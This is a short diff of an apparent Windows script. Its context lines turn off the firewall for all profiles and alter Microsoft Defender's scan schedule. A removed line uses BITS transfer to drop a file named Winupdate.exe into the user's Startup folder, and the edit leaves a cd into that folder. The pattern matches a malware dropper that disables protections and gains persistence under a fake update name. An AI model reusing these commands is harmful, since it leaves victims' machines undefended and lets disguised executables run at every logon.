@@ -73,6 +73,5 @@ powershell.exe -command "Set-MpPreference -ScanScheduleDay 8"
 
 powershell.exe -command "netsh advfirewall set allprofiles state off"
 
-
-cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startuppowershell -command "start-bitstransfer 1   .\Winupdate.exe" 
+cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
    
